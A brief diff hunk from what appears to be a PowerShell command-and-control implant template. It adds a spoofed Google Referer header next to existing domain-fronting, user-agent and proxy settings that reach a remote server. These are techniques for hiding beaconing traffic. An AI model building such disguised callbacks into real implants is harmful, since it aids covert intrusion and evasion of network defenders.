@@ -36,6 +36,7 @@ $h="'+$domainfrontheader+'"
 if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
 elseif($h){$script:s="https://$($h)/'+$connect+'"}
 $wc.Headers.Add("User-Agent","'+$useragent+'")
+$wc.Headers.Add("Referer","https://www.google.com")
 if ($proxyurl) {
 $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
 if ($username -and $password) {
